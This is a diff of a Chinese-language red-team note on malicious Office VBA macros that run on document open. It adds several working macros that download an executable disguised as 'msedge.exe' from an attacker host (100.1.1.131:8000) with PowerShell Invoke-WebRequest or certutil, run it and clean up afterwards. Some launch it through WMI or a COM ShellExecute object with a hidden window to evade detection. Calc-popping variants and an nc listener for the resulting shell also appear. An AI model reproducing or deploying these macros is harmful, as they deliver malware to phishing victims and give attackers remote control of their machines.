@@ -10,15 +10,18 @@
   - [概述](#概述)
     - [VBA宏的结构](#vba宏的结构)
   - [执行 JavaScript](#执行-javascript)
-  - [调Powershell](#调powershell)
-  - [调Certutil](#调certutil)
+  - [调用 PowerShell 使用 curl 下载与执行恶意程序](#调用-powershell-使用-curl-下载与执行恶意程序)
+  - [调用 CMD 执行命令](#调用-cmd-执行命令)
+    - [调用 CMD 使用 curl 下载与执行恶意程序](#调用-cmd-使用-curl-下载与执行恶意程序)
+    - [调用 CMD 使用 Certutil 下载与执行恶意程序](#调用-cmd-使用-certutil-下载与执行恶意程序)
   - [调CScript调JSCript/VBScript](#调cscript调jscriptvbscript)
   - [调WScript调JSCript/VBScript](#调wscript调jscriptvbscript)
   - [CobaltStrike宏钓鱼(DLL注入)](#cobaltstrike宏钓鱼dll注入)
     - [代码解析](#代码解析)
       - [结构体定义](#结构体定义)
       - [函数声明](#函数声明)
-  - [VBA宏加载远程XSL](#vba宏加载远程xsl)
+  - [VBA宏加载远程XSL(XMLDOM)](#vba宏加载远程xslxmldom)
+    - [概念](#概念)
     - [利用方案](#利用方案)
       - [生成 Shellcode(Payload.bin)](#生成-shellcodepayloadbin)
       - [处理 payload.bin](#处理-payloadbin)
@@ -157,7 +160,37 @@ End Sub
 
 ---
 
-## 调Powershell
+## 调用 PowerShell 使用 curl 下载与执行恶意程序
+
+```vb
+Private Sub Document_Open()
+    Dim command As String
+    command = "powershell.exe -Command ""calc.exe"""
+    Call Shell(command, vbNormalFocus)
+End Sub
+```
+
+需要注意的是 `powershell.exe -Command` 后面的命令要用**两层**双引号包裹起来, 一层是Powershell需要的,一层是VBA Call Shell 需要的
+
+![image-20240712145248578](http://cdn.ayusummer233.top/DailyNotes/202407121452738.png)
+
+---
+
+调用 Powershell 使用 Invoke-WebRequest 下载恶意程序然后使用 Start-Process 执行
+
+```vb
+Private Sub Document_Open()
+    Dim command As String
+    command = "powershell.exe -Command ""Invoke-WebRequest -Uri http://100.1.1.131:8000/download/msedge.exe -OutFile msedge.exe; Start-Process msedge.exe"""
+    Call Shell(command, vbNormalFocus)
+End Sub
+```
+
+---
+
+## 调用 CMD 执行命令
+
+### 调用 CMD 使用 curl 下载与执行恶意程序
 
 ```vbscript
 Private Sub Document_Open()
@@ -166,6 +199,14 @@ Call Shell(Environ$("COMSPEC") & " /c powershell.exe curl http://100.1.1.131:800
 
 End Sub
 ```
+
+`Environ$("COMSPEC")`：获取系统环境变量`COMSPEC`的值。`COMSPEC`通常包含命令处理器的路径，例如`cmd.exe`, 可以用 PowerShell 看下
+
+```powershell
+Write-Host $env:COMSPEC
+```
+
+![image-20240712142736124](http://cdn.ayusummer233.top/DailyNotes/202407121427541.png)
 
 打开该文档机器实现 shell 上线
 
@@ -177,7 +218,7 @@ nc -lvvp 65521 | while read line; do echo "$(date '+%Y-%m-%d %H:%M:%S') $line";d
 
 ---
 
-## 调Certutil
+### 调用 CMD 使用 Certutil 下载与执行恶意程序
 
 ```vbscript
 Private Sub Document_Open()
@@ -839,7 +880,7 @@ End Type
 
 ---
 
-## VBA宏加载远程XSL
+## VBA宏加载远程XSL(XMLDOM)
 
 > [加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish (uknowsec.cn)](https://uknowsec.cn/posts/notes/加载远程XSL文件的宏免杀方法.html)
 >
@@ -854,6 +895,55 @@ End Type
 > ---
 >
 > [Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)](https://www.jianshu.com/p/8b01fca2c177)
+
+---
+
+### 概念
+
+> [XML文档对象模型 --- XML DOM (w3schools.com)](https://www.w3schools.com/xml/xml_dom.asp)
+
+DOM(Document Object Model)文档对象模型定义了访问和操作文档的标准
+
+HTML DOM 定义了访问 HTML 文档的标准方法, 它将 HTML 文档呈现为树结构
+
+XML DOM 定义了访问和操作 XML 文档的标准方法, 它将 XML 文档呈现为树结构
+
+---
+
+以 HTML 和 HTML DOM 为例进行区分
+
+- HTML
+
+  - `定义`: HTML 是一种标记语言，用于创建网页的结构和内容。它通过一系列标签（如 `<div>`, `<p>`, `<a>` 等）来定义网页的元素。
+  - `功能`: 
+    - 描述网页的结构和内容：使用标签来定义标题、段落、链接、图像、表格等元素。
+    - 标记内容：通过标签和属性来提供内容的语义信息，如 `<h1>` 表示主标题，`<p>` 表示段落。
+  - `静态`: HTML 文档本身是静态的，它只是描述了网页在浏览器中如何呈现。
+
+  例如
+
+  ```html
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <title>HTML 示例</title>
+  </head>
+  <body>
+    <h1>Hello, World!</h1>
+    <p>这是一个段落。</p>
+  </body>
+  </html>
+  ```
+
+  
+
+- HTML DOM
+
+  - `定义`:  HTML DOM 是浏览器解析 HTML 文档后生成的对象模型。它表示文档的结构，允许编程语言（主要是 JavaScript）动态访问和操作文档。
+  - `功能`
+    - 访问和修改：通过 DOM，开发者可以动态地访问和修改文档的内容、结构和样式。例如，添加新的节点、删除现有节点、修改节点的属性和文本内容等。
+    - 事件处理：DOM 提供事件模型，允许开发者注册事件处理程序，以响应用户的交互（如点击、输入等）。
+  - `动态`: HTML DOM 是动态的，通过编程接口，开发者可以在浏览器中实时更新和操作文档。
 
 ---
 
@@ -1021,18 +1111,45 @@ Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\roo
 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
 ' 创建 Win32_ProcessStartup 类的一个新实例，这个实例将用于配置新进程的启动参数。
 Set objConfig = objStartup.SpawnInstance_
+' 获取 Win32_Process 类的实例，该类用于创建和管理进程
+Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+' 创建一个新的进程，运行计算器程序（calc），将启动参数传递给新进程，并返回进程ID
+errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
+End Sub
+```
+
+```vb
+Private Sub Document_Open()
+Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+Set objConfig = objStartup.SpawnInstance_
 Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
 errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
 End Sub
 ```
 
-
+![image-20240712160058099](http://cdn.ayusummer233.top/DailyNotes/202407121600420.png)
 
 ![image-20240711144920180](http://cdn.ayusummer233.top/DailyNotes/202407111449956.png)
 
+---
 
+```vb
+Private Sub Document_Open()
+' 通过WMI连接到本地计算机的 CIMv2 命名空间，并设置模拟级别为“impersonate”，以允许脚本以调用者的权限运行WMI操作
+Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+' 获取 Win32_ProcessStartup 类的一个实例，该类包含进程启动配置的相关信息
+Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+' 创建 Win32_ProcessStartup 类的一个新实例，这个实例将用于配置新进程的启动参数。
+Set objConfig = objStartup.SpawnInstance_
+' 获取 Win32_Process 类的实例，该类用于创建和管理进程
+Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+' 创建一个新的进程，运行计算器程序（calc），将启动参数传递给新进程，并返回进程ID
+errReturn = objProcess.Create("cmd /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe && del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete", Null, objConfig, intProcessID)
+End Sub 
+```
 
-
+![image-20240712111753018](http://cdn.ayusummer233.top/DailyNotes/202407121117017.png)
 
 ---
 
@@ -1040,12 +1157,69 @@ End Sub
 
 >  [Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)](https://www.jianshu.com/p/8b01fca2c177)
 
+COM（Component Object Model）对象是通过一个或多个相关函数集来实现对对象数据的访问的对象。这些函数集被称为接口，接口的函数被称为方法。
+
+COM 基本上可以从VBScript引用任何COM对象(实际上是另一个可执行文件)并使用它的函数。例如，对象 `ShellBrowserWindow` 可以用来从资源管理器执行新的进程。
+
+`CreateObject` 是 VBScript 提供的一个函数，用于创建 COM 对象。
+
+----
+
+Windows 操作系统自带了 Windows Script Host 环境，允许使用脚本语言（如 VBScript 和 JScript）来自动化任务。通过 WSH，可以创建 `WScript.Shell` 对象来运行命令、打开文件、操作系统等。
+
+---
+
+弹个计算器:
+
 ```vb
-Private Sub Document_Open()
+Sub ducument_open()
 Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
-obj.Document.Application.ShellExecute "cmd.exe", "/c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe && del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete", "C:\Windows\System32", Null, 0
+obj.Document.Application.ShellExecute "calc", Null, "C:\\Windows\\System32", Null, 0
 End Sub
 ```
+
+- `Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")`:  创建一个新的COM对象。``C08AFD90-F2A1-11D1-8455-00A0C91F3880` 是 `Windows Script Host Shell` 对象的 `CLSID` （类标识符）。通过这种方式创建的对象提供了一些与 `Windows Shell` 交互的方法和属性
+
+- `obj.Document.Application.ShellExecute "calc", Null, "C:\\Windows\\System32", Null, 0`
+
+  使用Shell对象的 `ShellExecute`  方法来启动一个新进程
+
+  - `"calc"`：要执行的程序名称。
+  - `Null`：表示不传递参数给启动的程序。
+  - `"C:\\Windows\\System32"`：指定计算器程序所在的目录。
+  - `Null`：表示默认使用当前窗口显示模式。
+  - `0`：指定程序的启动方式，这里为隐藏模式（0 表示隐藏窗口）。
+
+![image-20240712160406287](http://cdn.ayusummer233.top/DailyNotes/202407121604470.png)
+
+---
+
+调用 CMD 执行 `calc.exe`
+
+```vb
+Private Sub Document_Open()
+  Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+  obj.Document.Application.ShellExecute "cmd.exe", "/c calc.exe", "C:\Windows\System32", Null, 0
+End Sub
+```
+
+![image-20240712160940200](http://cdn.ayusummer233.top/DailyNotes/202407121609386.png)
+
+---
+
+调用 cmd 使用 Certutil 下载恶意程序然后执行
+
+```vb
+Private Sub Document_Open()
+  Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+  obj.Document.Application.ShellExecute "cmd.exe", "/c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe && del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete", "C:\Windows\System32", Null, 0
+End Sub
+```
+
+![image-20240712161607021](http://cdn.ayusummer233.top/DailyNotes/202407121616272.png)
+
+
+---
 
 
 
